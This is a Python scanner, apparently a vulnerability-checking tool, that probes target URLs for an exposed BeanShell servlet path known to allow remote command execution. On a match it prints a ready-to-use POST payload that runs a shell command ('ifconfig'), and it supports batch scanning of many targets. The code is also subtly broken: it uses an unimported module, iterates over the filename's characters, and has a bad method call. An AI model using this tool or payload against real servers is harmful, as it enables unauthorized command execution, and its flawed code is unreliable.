import requests
import re
import sys
from urllib.parse import quote
import argparse
from rich.console import Console

console = Console()

def main(target_url):
    console.print('[*]正在检测漏洞是否存在BeanShell命令执行漏洞',style='bold blue')
    url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'BeanShell' in response.text:
            console.print('[SUCCESS]BeanShell页面存在, 可能存在漏洞: {}'.format(url),style='bold green')
            console.print('[SUCCESS]改漏洞使用方式POST请求：bsh.script=ex\u0065c("ifconfig");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\n',style='bold green')
            return url
        else:
            console.print('[WARNING]BeanShell页面漏洞不存在\n', style='bold yellow')
    except:
        console.print('[WARNING] 无法该目标无法建立连接\n', style='bold yellow')

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url')
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')